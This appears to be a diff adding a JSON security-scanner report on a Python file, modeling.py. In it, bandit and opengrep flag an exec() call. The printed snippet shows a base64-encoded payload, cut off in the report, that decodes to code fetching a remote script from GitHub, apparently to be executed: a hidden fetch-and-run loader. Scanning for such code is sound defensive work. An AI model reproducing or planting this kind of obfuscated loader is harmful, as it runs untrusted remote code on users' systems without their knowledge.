@@ -1,0 +1,48 @@
+{
+  "file_path": "/tmp/scan_workspace/a350h__GoodbyeWorld/modeling.py",
+  "file_name": "modeling.py",
+  "file_size": 2267,
+  "flagged": true,
+  "worst_severity": "high",
+  "flagged_by": [
+    "bandit",
+    "opengrep"
+  ],
+  "skipped": null,
+  "verdicts": [
+    {
+      "scanner": "bandit",
+      "flagged": true,
+      "severity": "medium",
+      "details": {
+        "confidence": "high",
+        "file": "modeling.py",
+        "message": "Use of exec detected.",
+        "line": 13
+      },
+      "error": null,
+      "duration": 0.217
+    },
+    {
+      "scanner": "opengrep",
+      "flagged": true,
+      "severity": "high",
+      "details": {
+        "file": "/tmp/scan_workspace/a350h__GoodbyeWorld/modeling.py",
+        "findings_count": 1,
+        "findings": [
+          {
+            "rule_id": "python.lang.security.audit.exec-detected.exec-detected",
+            "message": "Detected the use of exec(). exec() can be dangerous if used to evaluate dynamic content. If this content can be input from outside the program, this may be a code injection vulnerability. Ensure evaluated content is not definable by external sources.",
+            "severity": "WARNING",
+            "line": 13,
+            "snippet": "        exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCnVybCA9ICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYWg3My9IZWxsb1dvcmxkL3JlZnMvaGVhZHMvbWFpbi9oZWxsb3dvcmxkLnB5IgpyZXNwb25zZSA9IHJlcXVlc3RzLmdl"
+          }
+        ],
+        "returncode": 0
+      },
+      "error": null,
+      "duration": 11.543
+    }
+  ]
+}
